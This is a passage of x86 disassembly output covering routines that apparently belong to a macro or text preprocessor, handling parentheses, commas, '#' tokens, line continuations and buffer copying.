  40324d:	5e                   	pop    %esi
  40324e:	f9                   	stc
  40324f:	c3                   	ret
  403250:	e8 b4 11 00 00       	call   0x404409
  403255:	ba 30 08 40 00       	mov    $0x400830,%edx
  40325a:	72 22                	jb     0x40327e
  40325c:	e8 a2 10 00 00       	call   0x404303
  403261:	72 1b                	jb     0x40327e
  403263:	e8 24 34 00 00       	call   0x40668c
  403268:	72 14                	jb     0x40327e
  40326a:	ba 40 00 00 00       	mov    $0x40,%edx
  40326f:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  403275:	77 09                	ja     0x403280
  403277:	e8 27 0c 00 00       	call   0x403ea3
  40327c:	75 02                	jne    0x403280
  40327e:	f9                   	stc
  40327f:	c3                   	ret
  403280:	e8 d5 0a 00 00       	call   0x403d5a
  403285:	8b 15 68 aa 40 00    	mov    0x40aa68,%edx
  40328b:	83 05 68 aa 40 00 40 	addl   $0x40,0x40aa68
  403292:	c7 42 20 08 00 00 00 	movl   $0x8,0x20(%edx)
  403299:	89 72 08             	mov    %esi,0x8(%edx)
  40329c:	89 f8                	mov    %edi,%eax
  40329e:	29 f0                	sub    %esi,%eax
  4032a0:	01 c8                	add    %ecx,%eax
  4032a2:	89 42 10             	mov    %eax,0x10(%edx)
  4032a5:	89 5a 0c             	mov    %ebx,0xc(%edx)
  4032a8:	a1 0c ab 40 00       	mov    0x40ab0c,%eax
  4032ad:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  4032b4:	74 09                	je     0x4032bf
  4032b6:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  4032bb:	66 8b 40 36          	mov    0x36(%eax),%ax
  4032bf:	66 89 42 06          	mov    %ax,0x6(%edx)
  4032c3:	a1 88 aa 40 00       	mov    0x40aa88,%eax
  4032c8:	e8 17 0c 00 00       	call   0x403ee4
  4032cd:	66 89 42 04          	mov    %ax,0x4(%edx)
  4032d1:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  4032d8:	75 12                	jne    0x4032ec
  4032da:	66 81 7c 1e fe 2e 48 	cmpw   $0x482e,-0x2(%esi,%ebx,1)
  4032e1:	74 09                	je     0x4032ec
  4032e3:	66 81 7c 1e fe 2e 68 	cmpw   $0x682e,-0x2(%esi,%ebx,1)
  4032ea:	75 03                	jne    0x4032ef
  4032ec:	09 f6                	or     %esi,%esi
  4032ee:	c3                   	ret
  4032ef:	89 d6                	mov    %edx,%esi
  4032f1:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  4032f7:	e8 9b fe ff ff       	call   0x403197
  4032fc:	72 08                	jb     0x403306
  4032fe:	89 35 88 aa 40 00    	mov    %esi,0x40aa88
  403304:	31 d2                	xor    %edx,%edx
  403306:	c3                   	ret
  403307:	56                   	push   %esi
  403308:	80 0d c9 ab 40 00 02 	orb    $0x2,0x40abc9
  40330f:	8b 4e 30             	mov    0x30(%esi),%ecx
  403312:	8b 7e 18             	mov    0x18(%esi),%edi
  403315:	e8 ef 10 00 00       	call   0x404409
  40331a:	72 45                	jb     0x403361
  40331c:	f6 05 c9 ab 40 00 04 	testb  $0x4,0x40abc9
  403323:	75 4d                	jne    0x403372
  403325:	e3 41                	jecxz  0x403368
  403327:	b0 0d                	mov    $0xd,%al
  403329:	f2 ae                	repnz scas %es:(%edi),%al
  40332b:	75 3b                	jne    0x403368
  40332d:	f6 05 c9 ab 40 00 20 	testb  $0x20,0x40abc9
  403334:	75 0a                	jne    0x403340
  403336:	8b 35 88 aa 40 00    	mov    0x40aa88,%esi
  40333c:	66 ff 46 36          	incw   0x36(%esi)
  403340:	89 3d 1c ab 40 00    	mov    %edi,0x40ab1c
  403346:	89 0d 20 ab 40 00    	mov    %ecx,0x40ab20
  40334c:	e3 c7                	jecxz  0x403315
  40334e:	80 3f 0a             	cmpb   $0xa,(%edi)
  403351:	75 c2                	jne    0x403315
  403353:	ff 05 1c ab 40 00    	incl   0x40ab1c
  403359:	ff 0d 20 ab 40 00    	decl   0x40ab20
  40335f:	eb b4                	jmp    0x403315
  403361:	e3 05                	jecxz  0x403368
  403363:	e8 8c 0b 00 00       	call   0x403ef4
  403368:	80 25 c9 ab 40 00 f9 	andb   $0xf9,0x40abc9
  40336f:	f9                   	stc
  403370:	eb 07                	jmp    0x403379
  403372:	80 25 c9 ab 40 00 f9 	andb   $0xf9,0x40abc9
  403379:	5e                   	pop    %esi
  40337a:	c3                   	ret
  40337b:	ff 35 68 aa 40 00    	push   0x40aa68
  403381:	8b 35 64 aa 40 00    	mov    0x40aa64,%esi
  403387:	3b 35 68 aa 40 00    	cmp    0x40aa68,%esi
  40338d:	73 4e                	jae    0x4033dd
  40338f:	83 3e 04             	cmpl   $0x4,(%esi)
  403392:	77 36                	ja     0x4033ca
  403394:	74 31                	je     0x4033c7
  403396:	83 3e 00             	cmpl   $0x0,(%esi)
  403399:	75 2c                	jne    0x4033c7
  40339b:	83 7e 14 00          	cmpl   $0x0,0x14(%esi)
  40339f:	75 07                	jne    0x4033a8
  4033a1:	e8 f1 fd ff ff       	call   0x403197
  4033a6:	72 1f                	jb     0x4033c7
  4033a8:	83 7e 30 00          	cmpl   $0x0,0x30(%esi)
  4033ac:	74 19                	je     0x4033c7
  4033ae:	89 35 88 aa 40 00    	mov    %esi,0x40aa88
  4033b4:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  4033ba:	e8 48 ff ff ff       	call   0x403307
  4033bf:	73 0e                	jae    0x4033cf
  4033c1:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  4033c7:	83 c6 20             	add    $0x20,%esi
  4033ca:	83 c6 20             	add    $0x20,%esi
  4033cd:	eb b8                	jmp    0x403387
  4033cf:	58                   	pop    %eax
  4033d0:	89 4e 30             	mov    %ecx,0x30(%esi)
  4033d3:	89 7e 18             	mov    %edi,0x18(%esi)
  4033d6:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4033dc:	c3                   	ret
  4033dd:	5a                   	pop    %edx
  4033de:	3b 15 68 aa 40 00    	cmp    0x40aa68,%edx
  4033e4:	74 09                	je     0x4033ef
  4033e6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4033e9:	e8 6e 14 00 00       	call   0x40485c
  4033ee:	c3                   	ret
  4033ef:	f9                   	stc
  4033f0:	c3                   	ret
  4033f1:	55                   	push   %ebp
  4033f2:	53                   	push   %ebx
  4033f3:	51                   	push   %ecx
  4033f4:	57                   	push   %edi
  4033f5:	56                   	push   %esi
  4033f6:	ff 35 cc aa 40 00    	push   0x40aacc
  4033fc:	ff 35 0c ab 40 00    	push   0x40ab0c
  403402:	ff 35 b4 aa 40 00    	push   0x40aab4
  403408:	ff 35 a8 aa 40 00    	push   0x40aaa8
  40340e:	ff 35 88 aa 40 00    	push   0x40aa88
  403414:	ff 35 18 ab 40 00    	push   0x40ab18
  40341a:	ff 35 14 ab 40 00    	push   0x40ab14
  403420:	ff 35 1c ab 40 00    	push   0x40ab1c
  403426:	ff 35 8c aa 40 00    	push   0x40aa8c
  40342c:	ff 35 20 ab 40 00    	push   0x40ab20
  403432:	ff 35 10 ab 40 00    	push   0x40ab10
  403438:	a0 c5 ab 40 00       	mov    0x40abc5,%al
  40343d:	8a 25 c8 ab 40 00    	mov    0x40abc8,%ah
  403443:	50                   	push   %eax
  403444:	a0 c0 ab 40 00       	mov    0x40abc0,%al
  403449:	8a 25 c9 ab 40 00    	mov    0x40abc9,%ah
  40344f:	50                   	push   %eax
  403450:	8a 25 ca ab 40 00    	mov    0x40abca,%ah
  403456:	50                   	push   %eax
  403457:	89 e5                	mov    %esp,%ebp
  403459:	83 ec 28             	sub    $0x28,%esp
  40345c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40345f:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403462:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403465:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  403468:	e8 99 13 00 00       	call   0x404806
  40346d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403470:	8b 15 64 aa 40 00    	mov    0x40aa64,%edx
  403476:	e8 e1 13 00 00       	call   0x40485c
  40347b:	72 25                	jb     0x4034a2
  40347d:	e8 d0 fc ff ff       	call   0x403152
  403482:	73 13                	jae    0x403497
  403484:	52                   	push   %edx
  403485:	e8 c2 13 00 00       	call   0x40484c
  40348a:	72 0a                	jb     0x403496
  40348c:	e8 c1 fc ff ff       	call   0x403152
  403491:	72 f2                	jb     0x403485
  403493:	5b                   	pop    %ebx
  403494:	eb 01                	jmp    0x403497
  403496:	5a                   	pop    %edx
  403497:	83 7a 0c 01          	cmpl   $0x1,0xc(%edx)
  40349b:	72 15                	jb     0x4034b2
  40349d:	8b 42 1c             	mov    0x1c(%edx),%eax
  4034a0:	eb 31                	jmp    0x4034d3
  4034a2:	f6 05 ca ab 40 00 20 	testb  $0x20,0x40abca
  4034a9:	75 25                	jne    0x4034d0
  4034ab:	e8 cb fe ff ff       	call   0x40337b
  4034b0:	72 1e                	jb     0x4034d0
  4034b2:	f6 05 c9 ab 40 00 10 	testb  $0x10,0x40abc9
  4034b9:	75 18                	jne    0x4034d3
  4034bb:	e8 28 fb ff ff       	call   0x402fe8
  4034c0:	73 11                	jae    0x4034d3
  4034c2:	e8 2d 0a 00 00       	call   0x403ef4
  4034c7:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  4034ce:	74 02                	je     0x4034d2
  4034d0:	31 d2                	xor    %edx,%edx
  4034d2:	f9                   	stc
  4034d3:	89 ec                	mov    %ebp,%esp
  4034d5:	59                   	pop    %ecx
  4034d6:	88 2d ca ab 40 00    	mov    %ch,0x40abca
  4034dc:	59                   	pop    %ecx
  4034dd:	88 2d c9 ab 40 00    	mov    %ch,0x40abc9
  4034e3:	88 0d c0 ab 40 00    	mov    %cl,0x40abc0
  4034e9:	59                   	pop    %ecx
  4034ea:	88 2d c8 ab 40 00    	mov    %ch,0x40abc8
  4034f0:	88 0d c5 ab 40 00    	mov    %cl,0x40abc5
  4034f6:	8f 05 10 ab 40 00    	pop    0x40ab10
  4034fc:	8f 05 20 ab 40 00    	pop    0x40ab20
  403502:	8f 05 8c aa 40 00    	pop    0x40aa8c
  403508:	8f 05 1c ab 40 00    	pop    0x40ab1c
  40350e:	8f 05 14 ab 40 00    	pop    0x40ab14
  403514:	8f 05 18 ab 40 00    	pop    0x40ab18
  40351a:	8f 05 88 aa 40 00    	pop    0x40aa88
  403520:	8f 05 a8 aa 40 00    	pop    0x40aaa8
  403526:	8f 05 b4 aa 40 00    	pop    0x40aab4
  40352c:	8f 05 0c ab 40 00    	pop    0x40ab0c
  403532:	8f 05 cc aa 40 00    	pop    0x40aacc
  403538:	5e                   	pop    %esi
  403539:	5f                   	pop    %edi
  40353a:	59                   	pop    %ecx
  40353b:	5b                   	pop    %ebx
  40353c:	5d                   	pop    %ebp
  40353d:	c3                   	ret
  40353e:	80 3f 28             	cmpb   $0x28,(%edi)
  403541:	74 0b                	je     0x40354e
  403543:	80 3f 29             	cmpb   $0x29,(%edi)
  403546:	74 44                	je     0x40358c
  403548:	47                   	inc    %edi
  403549:	80 3f 2c             	cmpb   $0x2c,(%edi)
  40354c:	75 f5                	jne    0x403543
  40354e:	47                   	inc    %edi
  40354f:	8a 07                	mov    (%edi),%al
  403551:	3c 20                	cmp    $0x20,%al
  403553:	74 f9                	je     0x40354e
  403555:	3c 09                	cmp    $0x9,%al
  403557:	74 f5                	je     0x40354e
  403559:	3c 5c                	cmp    $0x5c,%al
  40355b:	74 f1                	je     0x40354e
  40355d:	3c 0d                	cmp    $0xd,%al
  40355f:	74 ed                	je     0x40354e
  403561:	3c 0a                	cmp    $0xa,%al
  403563:	74 e9                	je     0x40354e
  403565:	80 3f 29             	cmpb   $0x29,(%edi)
  403568:	74 22                	je     0x40358c
  40356a:	80 3f 2c             	cmpb   $0x2c,(%edi)
  40356d:	74 1d                	je     0x40358c
  40356f:	57                   	push   %edi
  403570:	47                   	inc    %edi
  403571:	80 3f 29             	cmpb   $0x29,(%edi)
  403574:	74 05                	je     0x40357b
  403576:	80 3f 2c             	cmpb   $0x2c,(%edi)
  403579:	75 f5                	jne    0x403570
  40357b:	4f                   	dec    %edi
  40357c:	80 3f 20             	cmpb   $0x20,(%edi)
  40357f:	74 fa                	je     0x40357b
  403581:	80 3f 09             	cmpb   $0x9,(%edi)
  403584:	74 f5                	je     0x40357b
  403586:	89 fb                	mov    %edi,%ebx
  403588:	43                   	inc    %ebx
  403589:	5f                   	pop    %edi
  40358a:	29 fb                	sub    %edi,%ebx
  40358c:	c3                   	ret
  40358d:	8b 3d 80 ab 40 00    	mov    0x40ab80,%edi
  403593:	e8 a6 ff ff ff       	call   0x40353e
  403598:	74 1c                	je     0x4035b6
  40359a:	89 3d 80 ab 40 00    	mov    %edi,0x40ab80
  4035a0:	89 da                	mov    %ebx,%edx
  4035a2:	8b 3d 84 ab 40 00    	mov    0x40ab84,%edi
  4035a8:	e8 91 ff ff ff       	call   0x40353e
  4035ad:	74 15                	je     0x4035c4
  4035af:	89 3d 84 ab 40 00    	mov    %edi,0x40ab84
  4035b5:	c3                   	ret
  4035b6:	8b 3d 84 ab 40 00    	mov    0x40ab84,%edi
  4035bc:	e8 7d ff ff ff       	call   0x40353e
  4035c1:	75 01                	jne    0x4035c4
  4035c3:	c3                   	ret
  4035c4:	ba 8c 08 00 04       	mov    $0x400088c,%edx
  4035c9:	f9                   	stc
  4035ca:	c3                   	ret
  4035cb:	57                   	push   %edi
  4035cc:	39 f8                	cmp    %edi,%eax
  4035ce:	74 0b                	je     0x4035db
  4035d0:	4f                   	dec    %edi
  4035d1:	80 3f 20             	cmpb   $0x20,(%edi)
  4035d4:	74 f6                	je     0x4035cc
  4035d6:	80 3f 09             	cmpb   $0x9,(%edi)
  4035d9:	74 f1                	je     0x4035cc
  4035db:	80 3f 5c             	cmpb   $0x5c,(%edi)
  4035de:	5f                   	pop    %edi
  4035df:	c3                   	ret
  4035e0:	89 f8                	mov    %edi,%eax
  4035e2:	80 3f 29             	cmpb   $0x29,(%edi)
  4035e5:	74 17                	je     0x4035fe
  4035e7:	80 3f 0d             	cmpb   $0xd,(%edi)
  4035ea:	75 07                	jne    0x4035f3
  4035ec:	e8 da ff ff ff       	call   0x4035cb
  4035f1:	75 04                	jne    0x4035f7
  4035f3:	47                   	inc    %edi
  4035f4:	49                   	dec    %ecx
  4035f5:	75 eb                	jne    0x4035e2
  4035f7:	ba 8d 08 00 04       	mov    $0x400088d,%edx
  4035fc:	f9                   	stc
  4035fd:	c3                   	ret
  4035fe:	47                   	inc    %edi
  4035ff:	49                   	dec    %ecx
  403600:	c3                   	ret
  403601:	c7 05 84 ab 40 00 00 	movl   $0x0,0x40ab84
  403608:	00 00 00 
  40360b:	83 7a 0c 02          	cmpl   $0x2,0xc(%edx)
  40360f:	74 06                	je     0x403617
  403611:	83 7a 0c 03          	cmpl   $0x3,0xc(%edx)
  403615:	75 07                	jne    0x40361e
  403617:	8b 72 1c             	mov    0x1c(%edx),%esi
  40361a:	8b 52 18             	mov    0x18(%edx),%edx
  40361d:	c3                   	ret
  40361e:	53                   	push   %ebx
  40361f:	8b 4a 04             	mov    0x4(%edx),%ecx
  403622:	8b 42 08             	mov    0x8(%edx),%eax
  403625:	8a 52 03             	mov    0x3(%edx),%dl
  403628:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40362e:	01 d0                	add    %edx,%eax
  403630:	29 d1                	sub    %edx,%ecx
  403632:	73 04                	jae    0x403638
  403634:	31 c9                	xor    %ecx,%ecx
  403636:	eb 22                	jmp    0x40365a
  403638:	89 c7                	mov    %eax,%edi
  40363a:	80 3f 28             	cmpb   $0x28,(%edi)
  40363d:	75 0d                	jne    0x40364c
  40363f:	89 3d 84 ab 40 00    	mov    %edi,0x40ab84
  403645:	e8 96 ff ff ff       	call   0x4035e0
  40364a:	72 19                	jb     0x403665
  40364c:	e3 0c                	jecxz  0x40365a
  40364e:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  403655:	e8 74 f7 ff ff       	call   0x402dce
  40365a:	89 fe                	mov    %edi,%esi
  40365c:	e8 83 f6 ff ff       	call   0x402ce4
  403661:	89 fa                	mov    %edi,%edx
  403663:	29 f2                	sub    %esi,%edx
  403665:	5b                   	pop    %ebx
  403666:	c3                   	ret
  403667:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  40366d:	76 07                	jbe    0x403676
  40366f:	ba 8b 18 00 00       	mov    $0x188b,%edx
  403674:	f9                   	stc
  403675:	c3                   	ret
  403676:	50                   	push   %eax
  403677:	89 d9                	mov    %ebx,%ecx
  403679:	89 f3                	mov    %esi,%ebx
  40367b:	01 c8                	add    %ecx,%eax
  40367d:	29 d1                	sub    %edx,%ecx
  40367f:	72 1c                	jb     0x40369d
  403681:	74 4a                	je     0x4036cd
  403683:	89 c6                	mov    %eax,%esi
  403685:	89 c7                	mov    %eax,%edi
  403687:	29 cf                	sub    %ecx,%edi
  403689:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  40368f:	29 c1                	sub    %eax,%ecx
  403691:	76 02                	jbe    0x403695
  403693:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403695:	89 3d 94 ab 40 00    	mov    %edi,0x40ab94
  40369b:	eb 30                	jmp    0x4036cd
  40369d:	fd                   	std
  40369e:	8b 3d 94 ab 40 00    	mov    0x40ab94,%edi
  4036a4:	89 fe                	mov    %edi,%esi
  4036a6:	29 cf                	sub    %ecx,%edi
  4036a8:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  4036ae:	89 3d 94 ab 40 00    	mov    %edi,0x40ab94
  4036b4:	3b 3d 98 ab 40 00    	cmp    0x40ab98,%edi
  4036ba:	72 09                	jb     0x4036c5
  4036bc:	e8 41 f7 ff ff       	call   0x402e02
  4036c1:	74 16                	je     0x4036d9
  4036c3:	eb ef                	jmp    0x4036b4
  4036c5:	29 c1                	sub    %eax,%ecx
  4036c7:	76 04                	jbe    0x4036cd
  4036c9:	4f                   	dec    %edi
  4036ca:	4e                   	dec    %esi
  4036cb:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4036cd:	fc                   	cld
  4036ce:	5f                   	pop    %edi
  4036cf:	89 de                	mov    %ebx,%esi
  4036d1:	89 d1                	mov    %edx,%ecx
  4036d3:	e3 02                	jecxz  0x4036d7
  4036d5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4036d7:	f8                   	clc
  4036d8:	c3                   	ret
  4036d9:	ba 8a 18 01 00       	mov    $0x1188a,%edx
  4036de:	fc                   	cld
  4036df:	58                   	pop    %eax
  4036e0:	f9                   	stc
  4036e1:	c3                   	ret
  4036e2:	53                   	push   %ebx
  4036e3:	57                   	push   %edi
  4036e4:	52                   	push   %edx
  4036e5:	8b 3d 80 ab 40 00    	mov    0x40ab80,%edi
  4036eb:	57                   	push   %edi
  4036ec:	e8 ef fe ff ff       	call   0x4035e0
  4036f1:	72 17                	jb     0x40370a
  4036f3:	89 fa                	mov    %edi,%edx
  4036f5:	2b 15 80 ab 40 00    	sub    0x40ab80,%edx
  4036fb:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  403701:	77 0c                	ja     0x40370f
  403703:	e8 9b 07 00 00       	call   0x403ea3
  403708:	75 05                	jne    0x40370f
  40370a:	58                   	pop    %eax
  40370b:	58                   	pop    %eax
  40370c:	f9                   	stc
  40370d:	eb 35                	jmp    0x403744
  40370f:	8b 35 80 ab 40 00    	mov    0x40ab80,%esi
  403715:	8b 3d 68 aa 40 00    	mov    0x40aa68,%edi
  40371b:	89 3d 80 ab 40 00    	mov    %edi,0x40ab80
  403721:	89 d1                	mov    %edx,%ecx
  403723:	e3 12                	jecxz  0x403737
  403725:	80 3e 20             	cmpb   $0x20,(%esi)
  403728:	74 05                	je     0x40372f
  40372a:	80 3e 09             	cmpb   $0x9,(%esi)
  40372d:	75 06                	jne    0x403735
  40372f:	46                   	inc    %esi
  403730:	49                   	dec    %ecx
  403731:	74 04                	je     0x403737
  403733:	eb f0                	jmp    0x403725
  403735:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403737:	89 d3                	mov    %edx,%ebx
  403739:	58                   	pop    %eax
  40373a:	31 d2                	xor    %edx,%edx
  40373c:	e8 26 ff ff ff       	call   0x403667
  403741:	72 c8                	jb     0x40370b
  403743:	5a                   	pop    %edx
  403744:	5f                   	pop    %edi
  403745:	5b                   	pop    %ebx
  403746:	c3                   	ret
  403747:	55                   	push   %ebp
  403748:	8b 2d 94 ab 40 00    	mov    0x40ab94,%ebp
  40374e:	e8 3a fe ff ff       	call   0x40358d
  403753:	0f 82 9f 00 00 00    	jb     0x4037f8
  403759:	0f 84 99 00 00 00    	je     0x4037f8
  40375f:	8b 35 90 ab 40 00    	mov    0x40ab90,%esi
  403765:	89 d9                	mov    %ebx,%ecx
  403767:	8b 3d 84 ab 40 00    	mov    0x40ab84,%edi
  40376d:	8a 07                	mov    (%edi),%al
  40376f:	39 ee                	cmp    %ebp,%esi
  403771:	74 db                	je     0x40374e
  403773:	38 06                	cmp    %al,(%esi)
  403775:	74 03                	je     0x40377a
  403777:	46                   	inc    %esi
  403778:	eb f5                	jmp    0x40376f
  40377a:	89 f0                	mov    %esi,%eax
  40377c:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40377e:	74 05                	je     0x403785
  403780:	89 c6                	mov    %eax,%esi
  403782:	46                   	inc    %esi
  403783:	eb e0                	jmp    0x403765
  403785:	53                   	push   %ebx
  403786:	56                   	push   %esi
  403787:	50                   	push   %eax
  403788:	53                   	push   %ebx
  403789:	52                   	push   %edx
  40378a:	8b 3d 80 ab 40 00    	mov    0x40ab80,%edi
  403790:	e8 6e 0b 00 00       	call   0x404303
  403795:	5a                   	pop    %edx
  403796:	39 da                	cmp    %ebx,%edx
  403798:	5b                   	pop    %ebx
  403799:	58                   	pop    %eax
  40379a:	74 3b                	je     0x4037d7
  40379c:	39 05 90 ab 40 00    	cmp    %eax,0x40ab90
  4037a2:	74 18                	je     0x4037bc
  4037a4:	8a 48 ff             	mov    -0x1(%eax),%cl
  4037a7:	80 f9 27             	cmp    $0x27,%cl
  4037aa:	74 2b                	je     0x4037d7
  4037ac:	80 f9 22             	cmp    $0x22,%cl
  4037af:	74 26                	je     0x4037d7
  4037b1:	80 f9 28             	cmp    $0x28,%cl
  4037b4:	75 06                	jne    0x4037bc
  4037b6:	80 3c 18 29          	cmpb   $0x29,(%eax,%ebx,1)
  4037ba:	74 1b                	je     0x4037d7
  4037bc:	8b 35 80 ab 40 00    	mov    0x40ab80,%esi
  4037c2:	c6 46 ff 28          	movb   $0x28,-0x1(%esi)
  4037c6:	c6 04 16 29          	movb   $0x29,(%esi,%edx,1)
  4037ca:	4e                   	dec    %esi
  4037cb:	83 c2 02             	add    $0x2,%edx
  4037ce:	e8 94 fe ff ff       	call   0x403667
  4037d3:	72 22                	jb     0x4037f7
  4037d5:	eb 0d                	jmp    0x4037e4
  4037d7:	8b 35 80 ab 40 00    	mov    0x40ab80,%esi
  4037dd:	e8 85 fe ff ff       	call   0x403667
  4037e2:	72 13                	jb     0x4037f7
  4037e4:	5e                   	pop    %esi
  4037e5:	5b                   	pop    %ebx
  4037e6:	89 e8                	mov    %ebp,%eax
  4037e8:	8b 2d 94 ab 40 00    	mov    0x40ab94,%ebp
  4037ee:	29 e8                	sub    %ebp,%eax
  4037f0:	29 c6                	sub    %eax,%esi
  4037f2:	e9 6e ff ff ff       	jmp    0x403765
  4037f7:	58                   	pop    %eax
  4037f8:	5d                   	pop    %ebp
  4037f9:	c3                   	ret
  4037fa:	8b 42 04             	mov    0x4(%edx),%eax
  4037fd:	a3 20 ab 40 00       	mov    %eax,0x40ab20
  403802:	8b 42 08             	mov    0x8(%edx),%eax
  403805:	a3 1c ab 40 00       	mov    %eax,0x40ab1c
  40380a:	89 15 b0 aa 40 00    	mov    %edx,0x40aab0
  403810:	83 3d 80 ab 40 00 00 	cmpl   $0x0,0x40ab80
  403817:	74 2c                	je     0x403845
  403819:	e8 c4 fe ff ff       	call   0x4036e2
  40381e:	72 4a                	jb     0x40386a
  403820:	e8 dc fd ff ff       	call   0x403601
  403825:	72 41                	jb     0x403868
  403827:	83 3d 84 ab 40 00 00 	cmpl   $0x0,0x40ab84
  40382e:	74 33                	je     0x403863
  403830:	a1 90 ab 40 00       	mov    0x40ab90,%eax
  403835:	e8 2d fe ff ff       	call   0x403667
  40383a:	72 2e                	jb     0x40386a
  40383c:	e8 06 ff ff ff       	call   0x403747
  403841:	72 25                	jb     0x403868
  403843:	eb 25                	jmp    0x40386a
  403845:	e8 b7 fd ff ff       	call   0x403601
  40384a:	72 1c                	jb     0x403868
  40384c:	83 3d 84 ab 40 00 00 	cmpl   $0x0,0x40ab84
  403853:	75 0e                	jne    0x403863
  403855:	a1 90 ab 40 00       	mov    0x40ab90,%eax
  40385a:	e8 08 fe ff ff       	call   0x403667
  40385f:	72 07                	jb     0x403868
  403861:	eb 07                	jmp    0x40386a
  403863:	ba 8c 08 00 04       	mov    $0x400088c,%edx
  403868:	f9                   	stc
  403869:	c3                   	ret
  40386a:	c7 05 b0 aa 40 00 00 	movl   $0x0,0x40aab0
  403871:	00 00 00 
  403874:	c3                   	ret
  403875:	89 f8                	mov    %edi,%eax
  403877:	48                   	dec    %eax
  403878:	3b 05 8c ab 40 00    	cmp    0x40ab8c,%eax
  40387e:	74 26                	je     0x4038a6
  403880:	48                   	dec    %eax
  403881:	80 38 20             	cmpb   $0x20,(%eax)
  403884:	74 f2                	je     0x403878
  403886:	80 38 09             	cmpb   $0x9,(%eax)
  403889:	74 ed                	je     0x403878
  40388b:	40                   	inc    %eax
  40388c:	47                   	inc    %edi
  40388d:	49                   	dec    %ecx
  40388e:	74 16                	je     0x4038a6
  403890:	80 3f 20             	cmpb   $0x20,(%edi)
  403893:	74 f7                	je     0x40388c
  403895:	80 3f 09             	cmpb   $0x9,(%edi)
  403898:	74 f2                	je     0x40388c
  40389a:	89 fb                	mov    %edi,%ebx
  40389c:	29 c3                	sub    %eax,%ebx
  40389e:	31 d2                	xor    %edx,%edx
  4038a0:	e8 c2 fd ff ff       	call   0x403667
  4038a5:	c3                   	ret
  4038a6:	f9                   	stc
  4038a7:	c3                   	ret
  4038a8:	80 3f 28             	cmpb   $0x28,(%edi)
  4038ab:	75 2a                	jne    0x4038d7
  4038ad:	c6 07 22             	movb   $0x22,(%edi)
  4038b0:	89 f8                	mov    %edi,%eax
  4038b2:	48                   	dec    %eax
  4038b3:	31 d2                	xor    %edx,%edx
  4038b5:	47                   	inc    %edi
  4038b6:	49                   	dec    %ecx
  4038b7:	74 36                	je     0x4038ef
  4038b9:	80 3f 28             	cmpb   $0x28,(%edi)
  4038bc:	75 01                	jne    0x4038bf
  4038be:	42                   	inc    %edx
  4038bf:	80 3f 29             	cmpb   $0x29,(%edi)
  4038c2:	75 f1                	jne    0x4038b5
  4038c4:	4a                   	dec    %edx
  4038c5:	79 ee                	jns    0x4038b5
  4038c7:	c6 07 22             	movb   $0x22,(%edi)
  4038ca:	bb 01 00 00 00       	mov    $0x1,%ebx
  4038cf:	31 d2                	xor    %edx,%edx
  4038d1:	e8 91 fd ff ff       	call   0x403667
  4038d6:	c3                   	ret
  4038d7:	4f                   	dec    %edi
  4038d8:	c6 07 22             	movb   $0x22,(%edi)
  4038db:	e8 23 0a 00 00       	call   0x404303
  4038e0:	89 f8                	mov    %edi,%eax
  4038e2:	31 db                	xor    %ebx,%ebx
  4038e4:	ba 01 00 00 00       	mov    $0x1,%edx
  4038e9:	e8 79 fd ff ff       	call   0x403667
  4038ee:	c3                   	ret
  4038ef:	f9                   	stc
  4038f0:	c3                   	ret
  4038f1:	8b 3d 8c ab 40 00    	mov    0x40ab8c,%edi
  4038f7:	8b 0d 94 ab 40 00    	mov    0x40ab94,%ecx
  4038fd:	29 f9                	sub    %edi,%ecx
  4038ff:	76 28                	jbe    0x403929
  403901:	b0 23                	mov    $0x23,%al
  403903:	f2 ae                	repnz scas %es:(%edi),%al
  403905:	75 22                	jne    0x403929
  403907:	e3 22                	jecxz  0x40392b
  403909:	80 3f 23             	cmpb   $0x23,(%edi)
  40390c:	75 09                	jne    0x403917
  40390e:	e8 62 ff ff ff       	call   0x403875
  403913:	72 1d                	jb     0x403932
  403915:	eb da                	jmp    0x4038f1
  403917:	f6 05 c9 ab 40 00 40 	testb  $0x40,0x40abc9
  40391e:	75 e1                	jne    0x403901
  403920:	e8 83 ff ff ff       	call   0x4038a8
  403925:	72 0b                	jb     0x403932
  403927:	eb c8                	jmp    0x4038f1
  403929:	f8                   	clc
  40392a:	c3                   	ret
  40392b:	ba 8e 08 00 01       	mov    $0x100088e,%edx
  403930:	eb 05                	jmp    0x403937
  403932:	ba 8f 08 00 01       	mov    $0x100088f,%edx
  403937:	8b 35 8c ab 40 00    	mov    0x40ab8c,%esi
  40393d:	8b 1d 94 ab 40 00    	mov    0x40ab94,%ebx
  403943:	29 f3                	sub    %esi,%ebx
  403945:	f9                   	stc
  403946:	c3                   	ret
  403947:	89 f8                	mov    %edi,%eax
  403949:	89 ca                	mov    %ecx,%edx
  40394b:	80 38 20             	cmpb   $0x20,(%eax)
  40394e:	75 06                	jne    0x403956
  403950:	4a                   	dec    %edx
  403951:	74 03                	je     0x403956
  403953:	40                   	inc    %eax
  403954:	eb f5                	jmp    0x40394b
  403956:	80 38 28             	cmpb   $0x28,(%eax)
  403959:	c3                   	ret
  40395a:	c7 05 80 ab 40 00 00 	movl   $0x0,0x40ab80
  403961:	00 00 00 
  403964:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
